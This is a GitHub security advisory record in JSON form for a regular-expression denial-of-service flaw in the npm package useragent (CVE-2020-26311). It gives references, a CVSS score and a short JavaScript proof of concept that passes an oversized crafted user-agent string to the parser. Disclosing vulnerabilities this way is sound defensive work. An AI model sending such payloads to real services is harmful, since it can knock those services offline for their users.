{
  "Severity": "MODERATE",
  "UpdatedAt": "2024-10-28T15:01:52Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "useragent"
  },
  "Advisory": {
    "DatabaseId": 264966,
    "Id": "GSA_kwCzR0hTQS1tZ2Z2LW00N3gtNHdxcM4ABAsG",
    "GhsaId": "GHSA-mgfv-m47x-4wqp",
    "References": [
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26311"
      },
      {
        "Url": "https://github.com/3rd-Eden/useragent/issues/167"
      },
      {
        "Url": "https://securitylab.github.com/advisories/GHSL-2020-312-redos-useragent"
      },
      {
        "Url": "https://github.com/3rd-Eden/useragent/commit/4c3ee79358bea72d88fe78ac98f4f861db40b89b"
      },
      {
        "Url": "https://github.com/3rd-Eden/useragent/blob/ffa906f923183c85fbb9e6c90f19345e2bd3c52a/lib/regexps.js#L5568"
      },
      {
        "Url": "https://github.com/advisories/GHSA-mgfv-m47x-4wqp"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-mgfv-m47x-4wqp"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2020-26311"
      }
    ],
    "Description": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).\n\n## PoC\n```js\nasync function exploit() {\n   const useragent = require(\\\"useragent\\\");\n\n   // Create a malicious user-agent that leads to excessive backtracking\n   const maliciousUserAgent = 'Mozilla/5.0 (' + 'X'.repeat(30000) + ') Gecko/20100101 Firefox/77.0';\n\n   // Parse the malicious user-agent\n   const agent = useragent.parse(maliciousUserAgent);\n\n   // Call the toString method to trigger the vulnerability\n   const result = await agent.device.toString();\n   console.log(result);\n}\n\nawait exploit();\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-10-26T21:30:47Z",
    "Severity": "MODERATE",
    "Summary": "useragent Regular Expression Denial of Service vulnerability",
    "UpdatedAt": "2025-09-03T15:17:54Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 2.3.0"
    }
  ]
}